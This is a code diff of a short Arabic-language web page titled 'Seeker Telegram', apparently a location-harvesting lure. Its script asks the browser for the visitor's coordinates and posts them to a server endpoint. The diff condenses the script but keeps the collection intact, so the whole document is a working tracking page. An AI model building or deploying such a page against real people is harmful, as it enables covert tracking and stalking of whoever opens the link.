@@ -1,38 +1,26 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>جارٍ تحديد موقعك...</title>
-</head>
+  <meta charset="UTF-8"><title>Seeker Telegram</title></head>
 <body>
-  <h2>🔍 الرجاء الانتظار، يتم تحديد موقعك...</h2>
+  <h2>🔍 جاري تحديد موقعك...</h2>
   <script>
-    function sendLocation(lat, lon) {
+    navigator.geolocation.getCurrentPosition(position => {
       fetch("/location", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: {"Content-Type":"application/json"},
         body: JSON.stringify({
-          latitude: lat,
-          longitude: lon
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
         })
       }).then(() => {
-        document.body.innerHTML = "<h2>📬 تم إرسال موقعك بنجاح!</h2>";
+        document.body.innerHTML = "<h2>✅ تم إرسال موقعك!</h2>";
       }).catch(() => {
-        document.body.innerHTML = "<h2>❌ فشل الإرسال!</h2>";
+        document.body.innerHTML = "<h2>❌ فشل الإرسال</h2>";
       });
-    }
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        sendLocation(position.coords.latitude, position.coords.longitude);
-      }, function(error) {
-        document.body.innerHTML = "<h2>❗ تم رفض إذن الوصول للموقع</h2>";
-      });
-    } else {
-      document.body.innerHTML = "<h2>❌ المتصفح لا يدعم تحديد الموقع</h2>";
-    }
+    }, error => {
+      document.body.innerHTML = "<h2>❗ تم رفض إذن الموقع</h2>";
+    });
   </script>
 </body>
 </html>
